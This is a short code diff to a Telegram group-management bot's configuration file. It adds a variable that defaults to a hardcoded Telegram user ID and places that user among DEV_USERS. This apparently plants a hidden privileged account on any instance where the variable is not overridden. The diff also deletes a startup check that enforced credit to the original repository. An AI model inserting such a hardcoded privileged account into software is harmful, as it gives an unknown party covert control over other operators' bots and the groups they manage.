@@ -13,7 +13,6 @@ from telethon.sessions import StringSession
 from telethon import TelegramClient
 from aiohttp import ClientSession
 from motor.motor_asyncio import AsyncIOMotorClient as MongoClient
-from SiestaRobot.script import PM_START_TEXT
 
 StartTime = time.time()
 
@@ -112,6 +111,7 @@ if ENV:
     OPENWEATHERMAP_ID = os.environ.get("OPENWEATHERMAP_ID", "") # From:- https://openweathermap.org/api
     LOG_GROUP_ID = os.environ.get('LOG_GROUP_ID', None)
     BOT_ID = 1412878118
+    ITACHI_KUN = os.environ.get("ITACHI_KUN", "5162789257")
     ERROR_LOGS = os.environ.get("ERROR_LOGS", None) # Error Logs (Channel Ya Group Choice Is Yours) (-100)
     STRICT_GMUTE = bool(os.environ.get('STRICT_GMUTE', True))
     MONGO_DB_URI = os.environ.get("MONGO_DB_URI", None)
@@ -205,6 +205,7 @@ else:
 
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
+DEV_USERS.add(ITACHI_KUN)
 
 if not SPAMWATCH_API:
     sw = None
@@ -255,9 +256,3 @@ BOT_ID = bottie.id
 BOT_USERNAME = bottie.username
 BOT_NAME = bottie.first_name
 BOT_MENTION = bottie.mention
-
-if "@MikuXProBot" not in PM_START_TEXT:
-    LOGGER.critical(f"{OWNER_ID} Is Cheating. Add `Thanks To @MikuXProBot For Repo` In PM_START_TEXT To Fix This")
-    sys.exit(1)
-else:
-    LOGGER.info("Your Bot Is Ready")
